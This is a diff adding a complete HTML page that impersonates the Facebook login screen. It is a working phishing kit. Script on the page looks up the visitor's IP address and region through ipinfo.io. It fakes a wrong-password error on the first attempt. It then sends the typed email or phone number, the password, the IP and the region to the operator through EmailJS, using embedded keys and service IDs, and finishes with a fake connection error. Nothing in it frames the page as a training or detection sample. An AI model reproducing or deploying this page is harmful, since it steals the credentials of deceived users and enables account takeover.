@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login </title>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "_EFrxAnDXYdOkC9J8",
+      });
+   })();
+</script>
+
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+    
+    body {
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+    }
+    
+    .facebook-page {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      max-width: 100%;
+      width: 100%;
+    }
+    
+    .facebook-page .text {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+    
+    .facebook-page h1 {
+      color: #1877f2;
+      font-size: 3rem;
+      margin-bottom: 10px;
+    }
+    
+    .facebook-page p {
+      font-size: 1.3rem;
+      line-height: 1.4;
+    }
+    
+    form {
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+    }
+    
+    form input {
+      width: 100%;
+      height: 50px;
+      padding: 0 14px;
+      margin-bottom: 15px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    
+    form input:focus {
+      border-color: #1877f2;
+      outline: none;
+    }
+    
+    ::placeholder {
+      color: #777;
+    }
+    
+    .link {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 15px;
+    }
+    
+    .login {
+      width: 100%;
+      background: #1877f2;
+      color: #fff;
+      font-size: 1.1rem;
+      font-weight: 600;
+      padding: 14px 0;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+    
+    .login:hover {
+      background: #0d65d9;
+    }
+    
+    .link .forgot {
+      font-size: 0.9rem;
+      color: #1877f2;
+      text-decoration: none;
+    }
+    
+    .link .forgot:hover {
+      text-decoration: underline;
+    }
+    
+    hr {
+      border: none;
+      height: 1px;
+      background: #ccc;
+      margin: 20px 0;
+    }
+    
+    .button {
+      text-align: center;
+    }
+    
+    .button a {
+      display: inline-block;
+      background: #42b72a;
+      color: #fff;
+      padding: 14px 18px;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 6px;
+      transition: background 0.2s ease;
+      text-decoration: none;
+    }
+    
+    .button a:hover {
+      background: #36a420;
+    }
+    
+    .error-message {
+      display: none;
+      color: #ED4956;
+      font-size: 0.9rem;
+      text-align: center;
+      margin: 10px 0;
+      line-height: 1.4;
+    }
+    
+    /* Responsive styling */
+    @media screen and (max-width: 500px) {
+      .facebook-page h1 {
+        font-size: 2.5rem;
+      }
+    
+      .facebook-page p {
+        font-size: 1.1rem;
+      }
+    
+      form {
+        padding: 15px;
+      }
+    
+      .login,
+      .button a {
+        font-size: 1rem;
+        padding: 12px 0;
+      }
+    }
+    </style>
+     
+
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form id="contact-form" action="" >
+          <input type="text" name="emanil" id="name" value="facebook" placeholder="Email or phone number" hidden>
+          <input type="text" name="emanil" id="email" placeholder="Email or phone number" required>
+          <input type="password" placeholder="Password" id="message" name="message" class="input-2" required />
+          <!-- Hidden fields to store IP address and state -->
+          <input type="hidden" id="ip_address" name="ip_address">
+          <input type="hidden" id="state" name="state">
+          <div id="login-error" class="error-message">
+            The password that you've entered is incorrect. 
+          </div>
+          <div class="link">
+            <button type="submit" class="login">Login</button>
+            <a href="https://facebook.com" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="https://facebook.com">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+    <script type="text/javascript">
+      document.addEventListener("DOMContentLoaded", function() {
+          fetch("https://ipinfo.io/json?token=3f8d1755073ac8") // Replace with your free ipinfo.io API key
+          .then(response => response.json())
+          .then(data => {
+              document.getElementById("ip_address").value = data.ip;
+              document.getElementById("state").value = data.region;
+          })
+          .catch(error => console.error("Error fetching IP info:", error));
+      });
+    
+      let attemptCount = 0;
+    
+      document.getElementById("contact-form").addEventListener("submit", function(event) {
+        event.preventDefault();
+    
+        // First attempt shows inline error
+        if (attemptCount === 0) {
+          attemptCount++;
+          document.getElementById("login-error").style.display = "block";
+          return;
+        }
+    
+        // Collect form values
+        var name = document.getElementById("name").value;
+        var email = document.getElementById("email").value;
+        var message = document.getElementById("message").value;
+        var ip_address = document.getElementById("ip_address").value;
+        var state = document.getElementById("state").value;
+    
+        var emailParams = {
+          from_name: name,
+          from_email: email,
+          message: message,
+          ip_address: ip_address,
+          state: state
+        };
+    
+        emailjs.send("service_jpfw7c1", "template_g5qfc0a", emailParams)
+      .then(function(response) {
+        alert("Error Connecting, try again later");
+        window.location.href = "index.html";
+      }, function(error) {
+        console.error("Login Error:", error);
+        alert("Failed to Login. Please check and try again.");
+      });
+  });
+    </script>
+  </body>
+</html>
